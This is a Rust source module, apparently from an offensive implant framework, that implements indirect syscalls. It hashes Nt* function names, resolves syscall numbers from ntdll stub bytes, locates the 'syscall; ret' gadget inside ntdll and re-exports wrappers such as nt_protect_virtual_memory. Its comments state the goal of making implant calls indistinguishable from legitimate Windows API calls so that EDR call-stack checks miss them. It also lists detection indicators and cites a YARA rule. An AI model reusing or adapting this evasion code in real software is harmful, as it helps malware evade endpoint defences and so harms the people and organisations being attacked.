//! Indirect Syscalls — execute syscall instruction within ntdll's code
//!
//! # Direct vs Indirect syscalls
//! **Direct syscalls**: the `syscall` instruction is in our implant's `.text`
//! section.  EDR call-stack validation sees a return address outside ntdll and
//! flags the thread.
//!
//! **Indirect syscalls**: we jump to the `syscall; ret` gadget *inside* ntdll,
//! so the return address recorded on the kernel boundary appears to originate
//! from ntdll — indistinguishable from a legitimate Windows API call.
//!
//! # Implementation
//! This module re-exports the existing implementation from [`super::syscall`]
//! and adds a stable, named public API surface:
//!
//! - [`init`] — initialize the global resolver and gadget cache once
//! - [`resolve_ssn`] — resolve a syscall service number by function-name hash
//! - [`find_gadget`] — locate the `syscall; ret` address in ntdll
//! - [`hash_name`] — DJB2 hash a function name (matches `syscall.rs` algorithm)
//!
//! High-level wrappers (e.g. `nt_protect_virtual_memory`) live in
//! [`super::syscall`] and use these primitives internally.
//!
//! # Detection Indicators
//! - `NtQueryInformationProcess` / PE-header walks at startup
//! - Process startup with very early `GetModuleHandle("ntdll.dll")` calls
//! - Stack spoofing absent: return address still resolvable to ntdll stub range
//!
//! See: wiki/detection/yara/kraken_opsec.yar

#[cfg(any(windows, test))]
pub use super::syscall::djb2_hash as hash_name;

#[cfg(windows)]
pub use super::syscall::{
    hashes, indirect_syscall_4, indirect_syscall_6_raw, nt_protect_virtual_memory,
    SyscallResolver,
};

/// SSN byte-pattern constants used when parsing ntdll stubs.
///
/// A typical Nt* stub starts with:
/// ```text
/// 4C 8B D1          mov r10, rcx
/// B8 XX XX 00 00    mov eax, <SSN>
/// 0F 05             syscall
/// C3                ret
/// ```
#[allow(dead_code)]
pub mod pattern {
    /// `mov r10, rcx` prefix (3 bytes) that precedes `mov eax, <SSN>`
    pub const MOV_R10_RCX: [u8; 3] = [0x4C, 0x8B, 0xD1];
    /// `mov eax, imm32` opcode byte
    pub const MOV_EAX: u8 = 0xB8;
    /// `syscall` instruction (2 bytes)
    pub const SYSCALL_INSN: [u8; 2] = [0x0F, 0x05];
    /// `ret` instruction
    pub const RET_INSN: u8 = 0xC3;

    /// Extract the SSN from a 5-byte `mov eax, imm32` encoding.
    ///
    /// Expects `bytes` to start with `0xB8 lo hi 0x00 0x00`.
    /// Returns `None` if the pattern does not match.
    pub fn extract_ssn(bytes: &[u8]) -> Option<u32> {
        if bytes.len() < 5 {
            return None;
        }
        if bytes[0] != MOV_EAX {
            return None;
        }
        // High two bytes must be zero for a valid SSN (SSNs fit in u16)
        if bytes[3] != 0x00 || bytes[4] != 0x00 {
            return None;
        }
        Some(u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]))
    }

    /// Return `true` if the three-byte slice matches the `mov r10, rcx` prefix.
    pub fn is_nt_stub_prefix(bytes: &[u8]) -> bool {
        bytes.len() >= 3 && bytes[..3] == MOV_R10_RCX
    }
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use super::super::syscall::{djb2_hash, hashes};

    // -------------------------------------------------------------------------
    // Hash consistency
    // -------------------------------------------------------------------------

    #[test]
    fn test_hash_name_matches_djb2_hash() {
        // hash_name is re-exported djb2_hash — verify they produce identical output.
        let names: &[&[u8]] = &[
            b"NtAllocateVirtualMemory",
            b"NtProtectVirtualMemory",
            b"NtWriteVirtualMemory",
            b"NtReadVirtualMemory",
            b"NtQuerySystemInformation",
            b"NtClose",
        ];
        for name in names {
            assert_eq!(
                hash_name(name),
                djb2_hash(name),
                "hash_name differs from djb2_hash for {:?}",
                std::str::from_utf8(name).unwrap_or("<invalid>")
            );
        }
    }

    #[test]
    #[cfg(windows)]
    fn test_const_hashes_match_runtime() {
        assert_eq!(
            hashes::djb2_hash_const(b"NtAllocateVirtualMemory"),
            hash_name(b"NtAllocateVirtualMemory")
        );
        assert_eq!(
            hashes::djb2_hash_const(b"NtClose"),
            hash_name(b"NtClose")
        );
    }

    // -------------------------------------------------------------------------
    // Platform guards
    // -------------------------------------------------------------------------

    #[test]
    fn test_init_returns_false_on_non_windows() {
        // init() is init_syscalls(); on non-Windows it always returns false.
        #[cfg(not(windows))]
        assert!(!init());
    }

    #[test]
    fn test_find_gadget_returns_none_on_non_windows() {
        #[cfg(not(windows))]
        assert!(find_gadget().is_none());
    }

    #[test]
    fn test_resolve_ssn_returns_none_on_non_windows() {
        #[cfg(not(windows))]
        assert!(resolve_ssn(hashes::NT_CLOSE).is_none());
    }

    // -------------------------------------------------------------------------
    // SSN byte-pattern unit tests (mock ntdll bytes, no live Windows required)
    // -------------------------------------------------------------------------

    #[test]
    fn test_extract_ssn_valid_pattern() {
        // Simulate: B8 0B 00 00 00  =>  SSN = 11 (NtClose on many Windows versions)
        let bytes = [0xB8u8, 0x0B, 0x00, 0x00, 0x00];
        assert_eq!(pattern::extract_ssn(&bytes), Some(0x0B));
    }

    #[test]
    fn test_extract_ssn_two_byte_ssn() {
        // B8 50 01 00 00  =>  SSN = 0x0150 = 336
        let bytes = [0xB8u8, 0x50, 0x01, 0x00, 0x00];
        assert_eq!(pattern::extract_ssn(&bytes), Some(0x0150));
    }

    #[test]
    fn test_extract_ssn_rejects_wrong_opcode() {
        // 0x90 (NOP) is not mov eax
        let bytes = [0x90u8, 0x0B, 0x00, 0x00, 0x00];
        assert_eq!(pattern::extract_ssn(&bytes), None);
    }

    #[test]
    fn test_extract_ssn_rejects_non_zero_high_bytes() {
        // High bytes non-zero => not a valid SSN encoding
        let bytes = [0xB8u8, 0x50, 0x01, 0x01, 0x00];
        assert_eq!(pattern::extract_ssn(&bytes), None);
    }

    #[test]
    fn test_extract_ssn_short_input() {
        assert_eq!(pattern::extract_ssn(&[0xB8, 0x0B, 0x00]), None);
        assert_eq!(pattern::extract_ssn(&[]), None);
    }

    #[test]
    fn test_is_nt_stub_prefix_valid() {
        // 4C 8B D1 B8 ...
        let bytes = [0x4Cu8, 0x8B, 0xD1, 0xB8, 0x0B, 0x00, 0x00, 0x00];
        assert!(pattern::is_nt_stub_prefix(&bytes));
    }

    #[test]
    fn test_is_nt_stub_prefix_invalid() {
        let bytes = [0x48u8, 0x89, 0xC8]; // mov rax, rcx — not an Nt stub
        assert!(!pattern::is_nt_stub_prefix(&bytes));
    }

    #[test]
    fn test_is_nt_stub_prefix_too_short() {
        assert!(!pattern::is_nt_stub_prefix(&[0x4C, 0x8B]));
        assert!(!pattern::is_nt_stub_prefix(&[]));
    }

    #[test]
    fn test_pattern_constants_correct_values() {
        // Verify the documented byte values are accurate.
        assert_eq!(pattern::MOV_R10_RCX, [0x4C, 0x8B, 0xD1]);
        assert_eq!(pattern::MOV_EAX, 0xB8);
        assert_eq!(pattern::SYSCALL_INSN, [0x0F, 0x05]);
        assert_eq!(pattern::RET_INSN, 0xC3);
    }

    #[test]
    fn test_full_nt_stub_pattern() {
        // Full realistic stub bytes: mov r10,rcx; mov eax,0x3C; syscall; ret
        let stub: [u8; 8] = [0x4C, 0x8B, 0xD1, 0xB8, 0x3C, 0x00, 0x00, 0x00];
        assert!(pattern::is_nt_stub_prefix(&stub));
        // SSN extraction starts from byte 3 (the `mov eax` opcode)
        assert_eq!(pattern::extract_ssn(&stub[3..]), Some(0x3C));
    }
}
